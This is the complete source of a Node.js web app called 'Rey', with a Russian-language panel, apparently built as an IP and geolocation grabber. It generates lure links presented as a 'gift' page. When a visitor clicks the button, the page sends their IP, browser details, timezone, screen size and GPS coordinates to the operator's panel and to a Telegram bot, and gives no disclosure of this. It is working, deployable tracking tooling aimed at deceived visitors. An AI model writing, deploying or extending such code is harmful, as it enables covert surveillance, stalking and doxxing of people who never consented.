console.log('REY STARTING');const http = require('http');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID = process.env.CHAT_ID || '';
const PANEL_PASS = process.env.PANEL_PASS || '1234';

const links = new Map();
const settings = { notify: true, geo: true };

const uid = (n=6) => crypto.randomBytes(n).toString('hex').slice(0,n);
const esc = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const json = (res, code, obj) => { res.writeHead(code, {'Content-Type':'application/json; charset=utf-8'}); res.end(JSON.stringify(obj)); };

async function notify(text){
  if (!settings.notify || !BOT_TOKEN || !CHAT_ID) return;
  try{
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode:'HTML'})
    });
  }catch(e){}
}

function auth(req){
  const cookie = req.headers.cookie || '';
  const m = cookie.match(/rey_auth=([^;]+)/);
  return m && m[1] === crypto.createHash('sha256').update(PANEL_PASS).digest('hex');
}

function landing(link){
  const title = esc(link.title || 'Тут подарок');
  const btn = esc(link.btn || 'Открыть');
  const geo = settings.geo;
  return `<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${title}</title>
<style>body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 0%,#1a1030,#0a0a0f 60%);color:#e8e8f0;font-family:system-ui,sans-serif;text-align:center;padding:24px}
h1{font-size:28px;margin:0 0 12px;background:linear-gradient(90deg,#7c5cff,#00d9a3);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
p{color:#8a8aa0;font-size:15px;line-height:1.6}
button{margin-top:28px;background:linear-gradient(135deg,#7c5cff,#5a3fd6);border:none;color:#fff;font-size:16px;font-weight:600;padding:15px 36px;border-radius:14px;cursor:pointer}</style></head><body>
<div class="card"><h1>${title}</h1><p>Нажми кнопку ниже.</p><button onclick="go()">${btn}</button></div>
<script>
async function go(){
const d={ua:navigator.userAgent,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+'x'+screen.height,platform:navigator.platform,ts:new Date().toISOString()};
const done=()=>{document.querySelector('.card').innerHTML='<h1>Спасибо</h1><p>Можешь закрыть.</p>'};
const send=async()=>{try{await fetch('/hit/${link.id}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})}catch(e){};done()};
if(${geo} && navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{d.lat=p.coords.latitude;d.lon=p.coords.longitude;send()},_=>send(),{timeout:6000})}else send();
}
</script></body></html>`;
}

const loginPage = `<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Rey вход</title>
<style>body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 0%,#1a1030,#0a0a0f 60%);color:#e8e8f0;font-family:system-ui,sans-serif;padding:24px}
.box{width:100%;max-width:360px;background:#111118;border:1px solid #1e1e2a;border-radius:18px;padding:24px;text-align:center}
input{width:100%;background:#0d0d14;border:1px solid #1e1e2a;border-radius:10px;padding:12px 14px;color:#e8e8f0;font-size:15px;outline:none;box-sizing:border-box}
button{width:100%;background:linear-gradient(135deg,#7c5cff,#5a3fd6);border:none;color:#fff;font-weight:600;font-size:15px;padding:14px;border-radius:12px;cursor:pointer;margin-top:16px}</style></head><body>
<div class="box"><div style="font-size:11px;letter-spacing:.4em;color:#6b6b80;margin-bottom:6px">REY</div><h2>Панель закрыта</h2><p style="font-size:13px;color:#6b6b80;margin-bottom:18px">Введи пароль</p>
<input id="p" type="password" placeholder="Пароль"><button onclick="go()">Войти</button></div>
<script>async function go(){const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pass:document.getElementById('p').value})});if(r.ok)location.href='/';else alert('Неверный пароль')}</script></body></html>`;

const panel = `<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"><title>Rey Panel</title>
<style>:root{--bg:#0a0a0f;--panel:#111118;--line:#1e1e2a;--txt:#e8e8f0;--dim:#6b6b80;--acc:#7c5cff;--acc2:#00d9a3;--red:#ff4d6d}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--txt);padding:20px 16px 100px;min-height:100vh;max-width:640px;margin:0 auto}
.logo{font-size:11px;letter-spacing:.4em;color:var(--dim);margin-bottom:6px}
h1{font-size:26px;margin-bottom:22px;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.card{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:18px;margin-bottom:16px}
.card h2{font-size:12px;letter-spacing:.15em;text-transform:uppercase;color:var(--dim);margin-bottom:14px}
label{display:block;font-size:13px;color:var(--dim);margin:12px 0 6px}
input{width:100%;background:#0d0d14;border:1px solid var(--line);border-radius:10px;padding:12px 14px;color:var(--txt);font-size:15px;outline:none}
input:focus{border-color:var(--acc)}
.btn{width:100%;background:linear-gradient(135deg,var(--acc),#5a3fd6);border:none;color:#fff;font-weight:600;font-size:15px;padding:14px;border-radius:12px;cursor:pointer;margin-top:16px}
.btn.ghost{background:#0d0d14;border:1px solid var(--line);color:var(--txt)}
.toggle{display:flex;justify-content:space-between;align-items:center;padding:12px 0}
.switch{width:46px;height:26px;border-radius:20px;background:#1e1e2a;position:relative;cursor:pointer;transition:background .2s;flex-shrink:0}
.switch.on{background:var(--acc)}
.switch::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#fff;transition:transform .2s}
.switch.on::after{transform:translateX(20px)}
.link{background:#0d0d14;border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:10px}
.link .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.link .name{font-weight:600;font-size:15px}
.link .hits{font-size:12px;color:var(--acc2);font-family:monospace}
.link .url{font-size:12px;color:var(--dim);word-break:break-all;font-family:monospace;background:#0a0a0f;padding:8px 10px;border-radius:8px;margin-bottom:10px;cursor:pointer}
.actions{display:flex;gap:8px}
.mini{flex:1;font-size:12px;padding:9px;border-radius:9px;border:1px solid var(--line);background:#111118;color:var(--txt);cursor:pointer;font-weight:500}
.mini.red{color:var(--red);border-color:rgba(255,77,109,.3)}
.empty{text-align:center;color:var(--dim);font-size:14px;padding:24px 0}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--acc2);color:#001a14;font-weight:600;font-size:14px;padding:12px 24px;border-radius:12px;transition:transform .3s;z-index:99;pointer-events:none}
.toast.show{transform:translateX(-50%) translateY(0)}
.hits-list{display:none}.hits-list.open{display:block}
.hit{background:#0a0a0f;border-radius:9px;padding:10px;margin-top:8px;font-size:12px;font-family:monospace;color:var(--dim);line-height:1.7}
.hit b{color:var(--txt)}</style></head><body>
<div class="logo">REY</div><h1>Панель</h1>
<div class="card"><h2>Новая ссылка</h2><label>Заголовок</label><input id="title" placeholder="Тут подарок" value="Тут подарок"><label>Текст кнопки</label><input id="btn" placeholder="Открыть" value="Открыть"><button class="btn" onclick="create()">Создать</button></div>
<div class="card"><h2>Настройки</h2><div class="toggle"><span>Уведомления в Telegram</span><div class="switch on" id="sw-notify" onclick="toggle('notify',this)"></div></div><div class="toggle"><span>Геолокация</span><div class="switch on" id="sw-geo" onclick="toggle('geo',this)"></div></div><button class="btn ghost" onclick="logout()">Выйти</button></div>
<div class="card"><h2>Мои ссылки</h2><div id="list"><div class="empty">Пока нет ссылок</div></div></div>
<div class="toast" id="toast"></div>
<script>
const API=location.origin;async function api(p,o){const r=await fetch(API+p,o);return r.json()}
function toast(t){const el=document.getElementById('toast');el.textContent=t;el.classList.add('show');setTimeout(()=>el.classList.remove('show'),1800)}
async function create(){const r=await api('/api/links',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:document.getElementById('title').value.trim()||'Тут подарок',btn:document.getElementById('btn').value.trim()||'Открыть'})});if(r.ok){toast('Создано');load()}else toast('Ошибка')}
async function toggle(k,el){const s=el.classList.toggle('on');await api('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({[k]:s})})}
async function load(){const links=await api('/api/links');const list=document.getElementById('list');if(!links.length){list.innerHTML='<div class="empty">Пока нет ссылок</div>';return}
list.innerHTML=links.map(l=>{const url=location.origin+'/l/'+l.id;const hits=l.hits||[];const hh=hits.map(h=>`<div class="hit"><b>${h.time}</b><br>IP: ${h.ip}<br>${h.ua}<br>${h.tz} · ${h.screen}${h.lat?`<br>Гео: ${h.lat}, ${h.lon}`:''}</div>`).join('');
return `<div class="link"><div class="top"><span class="name">${l.title}</span><span class="hits">${hits.length} визит.</span></div><div class="url" onclick="copy('${url}')">${url}</div><div class="actions"><button class="mini" onclick="copy('${url}')">Копировать</button><button class="mini" onclick="expand('${l.id}',this)">Визиты</button><button class="mini red" onclick="del('${l.id}')">Удалить</button></div><div class="hits-list" id="h-${l.id}">${hh||'<div class="hit">Пока пусто</div>'}</div></div>`}).join('')}
function expand(id,btn){const el=document.getElementById('h-'+id);el.classList.toggle('open');btn.textContent=el.classList.contains('open')?'Скрыть':'Визиты'}
function copy(t){navigator.clipboard.writeText(t).then(()=>toast('Скопировано')).catch(()=>toast('Не вышло'))}
async function del(id){if(!confirm('Удалить?'))return;await api('/api/links/'+id,{method:'DELETE'});toast('Удалено');load()}
async function logout(){await fetch('/api/logout',{method:'POST'});location.href='/login'}
async function loadSettings(){const s=await api('/api/settings');document.getElementById('sw-notify').classList.toggle('on',s.notify);document.getElementById('sw-geo').classList.toggle('on',s.geo)}
load();loadSettings();setInterval(load,8000);
</script></body></html>`;

const server = http.createServer((req, res) => {
  const u = req.url.split('?')[0];
  if (req.method === 'GET' && u === '/login'){ res.writeHead(200,{'Content-Type':'text/html; charset=utf-8'}); return res.end(loginPage); }
  if (req.method === 'POST' && u === '/api/login'){
    let b=''; req.on('data',c=>b+=c); req.on('end',()=>{ let d={}; try{d=JSON.parse(b)}catch(e){}
      if(d.pass===PANEL_PASS){ const t=crypto.createHash('sha256').update(PANEL_PASS).digest('hex');
        res.writeHead(200,{'Set-Cookie':`rey_auth=${t}; Path=/; HttpOnly; SameSite=Lax`,'Content-Type':'application/json'}); return res.end('{"ok":true}'); }
      json(res,401,{ok:false}); }); return;
  }
  if (req.method === 'POST' && u === '/api/logout'){ res.writeHead(200,{'Set-Cookie':'rey_auth=; Path=/; Max-Age=0'}); return res.end('{"ok":true}'); }
  const pub = u.startsWith('/l/') || u.startsWith('/hit/');
  if (!pub && !auth(req)){ if(u.startsWith('/api/')) return json(res,401,{error:'unauthorized'}); res.writeHead(302,{'Location':'/login'}); return res.end(); }
  if (req.method === 'GET' && (u === '/' || u === '/panel')){ res.writeHead(200,{'Content-Type':'text/html; charset=utf-8'}); return res.end(panel); }
  if (req.method === 'GET' && u.startsWith('/l/')){ const l=links.get(u.slice(3)); if(!l){res.writeHead(404);return res.end('not found')} res.writeHead(200,{'Content-Type':'text/html; charset=utf-8'}); return res.end(landing(l)); }
  if (req.method === 'POST' && u.startsWith('/hit/')){ const l=links.get(u.slice(5)); let b=''; req.on('data',c=>b+=c); req.on('end',async()=>{ let d={}; try{d=JSON.parse(b)}catch(e){}
    const ip=(req.headers['x-forwarded-for']||req.socket.remoteAddress||'').split(',')[0].trim();
    const h={ip,ua:d.ua||'',tz:d.tz||'',screen:d.screen||'',lat:d.lat??null,lon:d.lon??null,time:new Date().toLocaleString('ru-RU')};
    if(l) l.hits.push(h);
    await notify(['<b>Визит</b>',`IP: <code>${ip}</code>`,`UA: <code>${h.ua}</code>`,`TZ: ${h.tz}`,`Экран: ${h.screen}`,h.lat?`Гео: <code>${h.lat}, ${h.lon}</code>`:'Гео: нет',`Время: ${h.time}`].join('\n'));
    json(res,200,{ok:true}); }); return;
  }
  if (req.method === 'GET' && u === '/api/links') return json(res,200,[...links.values()].map(l=>({id:l.id,title:l.title,btn:l.btn,hits:l.hits})));
  if (req.method === 'POST' && u === '/api/links'){ let b=''; req.on('data',c=>b+=c); req.on('end',()=>{ let d={}; try{d=JSON.parse(b)}catch(e){} const id=uid(); links.set(id,{id,title:d.title||'Тут подарок',btn:d.btn||'Открыть',hits:[],createdAt:Date.now()}); json(res,200,{ok:true,id}); }); return; }
  if (req.method === 'DELETE' && u.startsWith('/api/links/')){ links.delete(u.slice(11)); return json(res,200,{ok:true}); }
  if (req.method === 'GET' && u === '/api/settings') return json(res,200,settings);
  if (req.method === 'POST' && u === '/api/settings'){ let b=''; req.on('data',c=>b+=c); req.on('end',()=>{ let d={}; try{d=JSON.parse(b)}catch(e){} Object.assign(settings,d); json(res,200,{ok:true}); }); return; }
  json(res,404,{error:'not found'});
});

server.listen(PORT, () => console.log('Rey :: http://localhost:' + PORT));
